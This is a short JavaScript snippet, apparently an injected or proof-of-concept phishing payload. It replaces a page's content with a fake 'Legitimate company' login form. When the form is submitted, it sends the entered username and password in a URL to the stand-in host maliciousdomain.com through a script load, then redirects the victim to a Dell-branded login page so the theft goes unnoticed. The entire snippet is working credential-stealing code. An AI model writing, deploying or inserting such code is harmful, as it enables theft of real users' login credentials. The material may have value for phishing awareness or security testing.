document.title = 'Allegiance-Login in';
document.getElementById('template').innerHTML = "<center><h1>Legitimate company<h1><p>username: <input type='textbox' id='username'></p><p>password: <input type='textbox' id='password'></p><p><button type='button' style='width: 20em;  height: 2em;' onclick='myFunction();'>Submit</button></p></center>";
function myFunction() {
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;
  $.getScript("http://maliciousdomain.com" + "/" + username + "/"+ password);
  window.location = "https://dell.inquisiteasp.com/common/Login";
};

